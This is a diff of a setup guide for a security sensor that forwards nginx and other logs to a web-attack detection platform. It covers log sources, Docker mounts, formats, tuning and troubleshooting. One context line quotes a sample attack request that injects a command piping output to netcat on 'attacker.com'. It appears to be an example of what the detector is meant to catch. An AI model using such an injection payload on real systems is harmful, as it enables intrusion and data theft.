@@ -143,10 +143,23 @@ log_sources:
     enabled: true
 ```
 
-> **Known limitation (#638):** the sensor does not read `log_sources` yet.
-> Its log forwarder reads fixed paths, `/var/log/nginx/access.log` among
-> them, whatever this section says. Until that is fixed, put the logs to
-> forward at that path.
+The sensor reads exactly the enabled sources of `log_sources`, and sends
+every line they hold to Wildbox: list log files only. `path` is absolute and
+may be a pattern (`/var/log/nginx/*access.log`). When the sensor starts it
+logs each source and, as a warning that names the source, any file it cannot
+read:
+
+```text
+Log source 'nginx_access': /var/log/nginx/access.log (format nginx, from the end of a file that already exists)
+Log source 'nginx_access': reading /var/log/nginx/access.log from byte 48211
+Log source 'nginx_access': /var/log/nginx/access.log is not read: this process (uid 999) is not allowed to read it
+```
+
+A file that does not exist yet is read from its beginning once it appears. A
+source the sensor cannot understand (an unknown key, type or format, a
+relative path) stops it at start-up with a message naming the source. The
+full reference is in the
+[sensor README](../../open-security-sensor/README.md#log-forwarding).
 
 ### Step 3: Test with Sample Logs
 
@@ -158,30 +171,66 @@ mkdir -p /tmp/wildbox-test/logs
 
 # Copy sample logs
 cp sample-logs/nginx-access.log /tmp/wildbox-test/logs/access.log
-
-# Update sensor config to point to test logs
-# Change path in config.yaml to: /tmp/wildbox-test/logs/access.log
 ```
+
+Then point the source at that file and have the sensor read what it already
+holds:
+
+```yaml
+log_sources:
+  - name: nginx_access
+    type: file
+    path: /tmp/wildbox-test/logs/access.log
+    format: nginx
+    read_from: beginning
+```
+
+By default (`read_from: end`) the sensor forwards only the lines written
+after it starts, so the sample lines already in the file would not be sent.
+`read_from: beginning` sends them, and sends them again at every restart:
+the sensor does not remember across restarts how far it has read. Use it for
+tests like this one, not for a production log. `quick-start.sh` writes this
+configuration to `/tmp/wildbox-test-config.yaml` for you.
 
 ### Step 4: Start the Sensor
 
-#### Option A: Using Docker (Recommended)
+#### Option A: Using Docker
+
+The sensor's container reads only what is mounted into it, and the compose
+files mount no host log. Mount the web server's log directory, read-only,
+and switch log forwarding on in the configuration the container uses.
+Create `docker-compose.override.yml` next to the root `docker-compose.yml`:
+
+```yaml
+services:
+  sensor:
+    volumes:
+      - /var/log/nginx:/host/var/log/nginx:ro
+    # The container runs as uid 999 with no capabilities. If the logs are
+    # not world-readable (Debian and Ubuntu: 640, group adm), add the group
+    # that may read them: stat -c %g /var/log/nginx/access.log
+    group_add:
+      - "4"
+```
+
+Then, in `open-security-sensor/config.yaml.example` (the file the container
+mounts as its configuration), set `collection.log_forwarding: true` and add
+the source, with the path as the container sees it:
+
+```yaml
+log_sources:
+  - name: nginx_access
+    type: file
+    path: /host/var/log/nginx/access.log
+    format: nginx
+```
 
 ```bash
-# From the Wildbox root directory
-cd ../../open-security-sensor
+# From the Wildbox root directory, with SENSOR_DATA_LAKE_API_KEY in .env
+docker compose up -d sensor
 
-# Copy your config
-cp ../use-cases/web-attack-detection/sensor-config/config.yaml ./config.yaml
-
-# Update the config for Docker paths
-# In config.yaml, change log path to: /host/var/log/nginx/access.log
-
-# Start with Docker Compose
-docker-compose up -d
-
-# View logs
-docker-compose logs -f sensor
+# The sensor says what it reads, and what it cannot
+docker compose logs sensor | grep "Log source"
 ```
 
 #### Option B: Running Locally
@@ -340,49 +389,43 @@ GET /exec?cmd=ls -la | nc attacker.com 1234 HTTP/1.1
 
 ## 🔧 Configuration Options
 
-### Log Source Types
+### Log Source Formats
 
-The sensor supports multiple log formats:
+A `type: file` source parses each line as its `format`:
 
 | Format | Description | Example Path |
 | -------- | ------------- | -------------- |
 | `nginx` | Nginx combined access log format | `/var/log/nginx/access.log` |
 | `apache` | Apache combined log format | `/var/log/apache2/access.log` |
 | `syslog` | Standard syslog format | `/var/log/syslog` |
-| `journald` | Systemd journal | N/A (uses journalctl) |
+| `raw` | The line as it is (the default) | `/var/log/app/*.log` |
+
+A line the format does not match is still forwarded, as `raw_message` only.
+The systemd journal is a source of its own, `type: journald`, with no path.
 
 ### Performance Tuning
 
 Adjust these settings based on your log volume:
 
 ```yaml
-performance:
-  query_interval: 10      # How often to check for new logs (seconds)
+data_lake:
   batch_size: 100         # Events per batch
-  flush_interval: 30      # Force flush every N seconds
-  max_queue_size: 1000    # Buffer size before dropping events
-  worker_threads: 2       # Concurrent processing threads
+  flush_interval: 30      # Send an incomplete batch after N seconds
+
+performance:
+  max_queue_size: 1000    # Events waiting between collection and sending
+  worker_threads: 2       # Concurrent processing tasks
 ```
+
+The forwarder looks at each file once a second and waits for the queue to
+take each line: when Wildbox is unreachable it stops reading, and continues
+from the same place in the file when it is reachable again.
 
 ### Log Filtering
 
-You can add filters to reduce noise:
-
-```yaml
-log_sources:
-  - name: nginx_access
-    type: file
-    path: /var/log/nginx/access.log
-    format: nginx
-    enabled: true
-    filters:
-      exclude_patterns:
-        - "health-check"
-        - "favicon.ico"
-      exclude_status_codes:
-        - 200
-        - 304
-```
+The sensor forwards every line of a source: there is no per-source filter.
+Narrow what is forwarded by what the source's `path` matches, and filter by
+request or status when you query the events.
 
 ## 📈 Next Steps
 
@@ -445,11 +488,16 @@ endpoint is not an `https://` gateway URL, the key is not an identity key
 ### No Events Being Ingested
 
 ```bash
+# What does the sensor read, and what could it not read? Each source is
+# logged at start-up, and a file it cannot read is a warning naming it
+docker-compose logs sensor | grep "Log source"
+
 # Verify log file exists and is readable
 ls -la /var/log/nginx/access.log
 
-# Check sensor has permission to read logs
-docker-compose exec sensor cat /host/var/log/nginx/access.log
+# Check sensor has permission to read logs (in the container: is the
+# directory mounted, and can uid 999 read the file?)
+docker-compose exec sensor head -1 /host/var/log/nginx/access.log
 
 # Is forwarding enabled, and what did the last batch get?
 docker-compose logs sensor | grep -i -E "forwarding|gateway|batch"
@@ -463,14 +511,20 @@ In the sensor's log, `HTTP 401` means the key is invalid, expired or revoked,
 certificate error that `data_lake.ca_bundle` does not hold the gateway's
 certificate.
 
+With `read_from: end`, the default, lines that were in the file before the
+sensor started are not sent: write new ones, or use `read_from: beginning`
+for a test. The same list of sources, the files each one is reading and its
+problems are in the sensor's local API, `GET /api/v1/components`, under
+`log_forwarder`.
+
 ### High Memory Usage
 
-```bash
+```yaml
 # Reduce batch size and queue size in config.yaml
-performance:
+data_lake:
   batch_size: 50
+performance:
   max_queue_size: 500
-  max_memory_mb: 128
 ```
 
 ## 📚 Additional Resources
